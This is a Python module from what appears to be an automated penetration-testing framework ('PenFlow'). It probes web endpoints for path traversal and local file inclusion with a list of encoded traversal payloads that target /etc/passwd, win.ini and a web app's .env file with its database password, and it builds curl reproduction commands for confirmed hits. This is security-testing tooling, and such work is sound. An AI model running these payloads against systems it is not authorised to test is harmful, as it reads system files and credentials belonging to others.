r"""
Path Traversal Capability Agent for PenFlow.

Capabilities:
  - Classic ../../../etc/passwd traversal
  - URL encoding & Double URL encoding bypasses (%2e%2e%2f, %252e%252e%252f)
  - Windows path traversal (..\..\..\windows\win.ini)
  - Null byte termination (%00)
  - Local & Remote File Inclusion (LFI/RFI)
  - nginx alias misconfiguration bypass (/files../etc/passwd)
"""
import httpx
import re
import urllib.parse
from typing import Dict, Any, List, Optional
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.path_traversal")

TRAVERSAL_PAYLOADS = [
    {"payload": "../../../etc/passwd", "marker": "root:", "subtype": "linux_etc_passwd"},
    {"payload": "....//....//....//etc/passwd", "marker": "root:", "subtype": "double_dot_bypass"},
    {"payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "marker": "root:", "subtype": "url_encoded"},
    {"payload": "%252e%252e%252f%252e%252e%252fetc%252fpasswd", "marker": "root:", "subtype": "double_url_encoded"},
    {"payload": "..%2f..%2f..%2fetc%2fpasswd", "marker": "root:", "subtype": "mixed_encoding"},
    {"payload": "../../../etc/passwd%00", "marker": "root:", "subtype": "null_byte_injection"},
    {"payload": "..\\..\\..\\windows\\win.ini", "marker": "[fonts]", "subtype": "windows_win_ini"},
    {"payload": "%5c..%5c..%5c..%5cwindows%5cwin.ini", "marker": "[fonts]", "subtype": "windows_url_encoded"},
    {"payload": "../../../../var/www/html/.env", "marker": "DB_PASSWORD", "subtype": "env_file_leak"},
    {"payload": "../etc/passwd", "marker": "root:", "subtype": "nginx_alias_misconfig"}
]

FILE_PARAMS = [
    "file", "path", "document", "folder", "root", "pg",
    "style", "pdf", "template", "doc", "page", "include",
    "file_path", "filename", "load", "url", "content", "dir"
]


class PathTraversalCapabilityAgent(BaseCapabilityAgent):
    """
    Capability Agent detecting Path Traversal, LFI, and nginx alias misconfigurations.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="PathTraversalCapabilityAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="path_traversal", name="Directory & Path Traversal", description="Detects path traversal and arbitrary file read vulnerabilities", priority=self.priority, tags=["lfi", "path_traversal"]),
            Capability(id="file_inclusion", name="Local File Inclusion", description="Detects LFI vulnerabilities accessing sensitive files", priority=self.priority, tags=["lfi"]),
            Capability(id="nginx_alias_bypass", name="nginx Alias Misconfig", description="Detects nginx alias traversal vulnerabilities", priority=self.priority, tags=["nginx", "alias"])
        ]

    def _discover_target_urls(self, context: CapabilityExecutionContext) -> List[Dict[str, Any]]:
        targets = []
        base_url = f"https://{context.asset}"

        for data in context.get_observation_data():
            if isinstance(data, dict):
                # 1. Inspect endpoints list
                for ep in data.get("endpoints", []):
                    if isinstance(ep, dict) and ep.get("url"):
                        ep_url = ep["url"]
                        parsed = urllib.parse.urlparse(ep_url)
                        q_params = urllib.parse.parse_qs(parsed.query)
                        # Check if endpoint has any file-like parameters
                        matched_params = [p for p in q_params if p.lower() in FILE_PARAMS]
                        if matched_params:
                            for mp in matched_params:
                                targets.append({"base_url": ep_url.split("?")[0], "param": mp, "existing_query": q_params})
                        elif q_params:
                            for p in q_params:
                                targets.append({"base_url": ep_url.split("?")[0], "param": p, "existing_query": q_params})

        # 2. Add standard image and file endpoints
        standard_endpoints = [
            (f"{base_url}/image", "filename"),
            (f"{base_url}/load-image", "filename"),
            (f"{base_url}/loadImage", "filename"),
            (f"{base_url}/download", "file"),
            (f"{base_url}/view", "filename"),
            (f"{base_url}/files", "path"),
            (f"{base_url}/static", "file"),
        ]
        for ep_path, p_name in standard_endpoints:
            targets.append({"base_url": ep_path, "param": p_name, "existing_query": {}})

        # Deduplicate
        seen = set()
        deduped = []
        for t in targets:
            key = (t["base_url"], t["param"])
            if key not in seen:
                seen.add(key)
                deduped.append(t)

        return deduped[:8]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        target_items = self._discover_target_urls(context)
        http_client = context.get_http_client()

        try:
            for item in target_items:
                base_ep = item["base_url"]
                param = item["param"]
                existing_q = dict(item["existing_query"])

                for p_item in TRAVERSAL_PAYLOADS:
                    payload = p_item["payload"]
                    marker = p_item["marker"]
                    subtype = p_item["subtype"]

                    query_dict = dict(existing_q)
                    query_dict[param] = [payload]
                    # Flatten query string preserving unencoded traversal where possible
                    query_str = urllib.parse.urlencode({k: v[0] for k, v in query_dict.items()}, safe="/.%")
                    test_url = f"{base_ep}?{query_str}"

                    try:
                        exch = await http_client.send_as_identity(
                            identity_id="anonymous_guest",
                            method="GET",
                            url=test_url
                        )
                        if not exch or not exch.response:
                            continue

                        resp = exch.response
                        resp_text = resp.body_text or ""
                        resp_status = resp.status_code

                        # Check status and genuine marker match
                        if resp_status == 200 and marker in resp_text:
                            # Verify not a generic error or reflected string inside HTML attribute
                            if marker == "root:" and ("root:x:0:0:" in resp_text or "root:*:0:0:" in resp_text or "root::0:0:" in resp_text or resp_text.startswith("root:")):
                                is_confirmed = True
                            elif marker == "[fonts]" and ("[extensions]" in resp_text or "[files]" in resp_text or "[mci extensions]" in resp_text):
                                is_confirmed = True
                            elif marker == "DB_PASSWORD" and ("APP_KEY" in resp_text or "DB_HOST" in resp_text):
                                is_confirmed = True
                            else:
                                is_confirmed = False

                            if is_confirmed:
                                curl_cmd = f"curl -i -s -k '{test_url}'"
                                exch_dict = exch.to_dict()

                                findings.append({
                                    "vulnerability_type": "path_traversal",
                                    "subtype": subtype,
                                    "target_url": test_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "severity": "CRITICAL" if "etc/passwd" in payload or ".env" in payload else "HIGH",
                                    "confidence": 0.98,
                                    "is_vulnerable": True,
                                    "exploit_curl": curl_cmd,
                                    "reproduction_steps": self.poc_generator.generate_reproduction_steps("Path Traversal", test_url, curl_cmd),
                                    "description": f"CRITICAL Arbitrary File Read: Path traversal confirmed on '{base_ep}' via parameter '{param}'. System file marker '{marker}' retrieved.",
                                    "_exchange_obj": exch_dict
                                })
                                evidence["traversal_success"] = True
                                evidence["vulnerable_parameter"] = param
                                logger.info(f"[{self.name}] 🔴 Path Traversal CONFIRMED on {test_url}")
                                break
                    except Exception as e:
                        logger.debug(f"Path traversal check failed on {test_url}: {e}")

                if findings:
                    break
        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")

        is_vuln = len(findings) > 0
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": 0.95 if is_vuln else 0.0,
            "confidence_score": 0.95 if is_vuln else 0.0,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
